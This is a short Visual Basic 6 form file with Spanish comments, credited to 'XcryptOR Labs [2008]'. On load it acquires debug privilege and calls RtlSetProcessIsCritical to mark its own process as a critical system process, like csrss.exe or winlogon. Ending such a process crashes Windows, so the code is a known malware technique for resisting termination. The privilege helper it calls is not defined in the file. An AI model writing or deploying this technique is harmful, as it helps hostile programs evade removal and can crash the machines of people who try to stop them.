VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   3090
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   4680
   LinkTopic       =   "Form1"
   ScaleHeight     =   3090
   ScaleWidth      =   4680
   StartUpPosition =   3  'Windows Default
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'*************************************************************************
'*************************************************************************
' Uso de RtlSetProcessIsCritical para setear nuestro proceso, como proceso
' critico del sistema: del mismo modo que csrss.exe o winlogon
' XcryptOR Labs [2008] - Made In Colombia
'**************************************************************************
'*************************************************************************
Private Sub Form_Load()
On Error Resume Next
ObtenerPrivilegios SE_DEBUG_NAME ' obtiene privilegios de Debugeo
Call RtlSetProcessIsCritical(0, 0, 1) ' setea nuestro proceso como Proceso Critico
End Sub
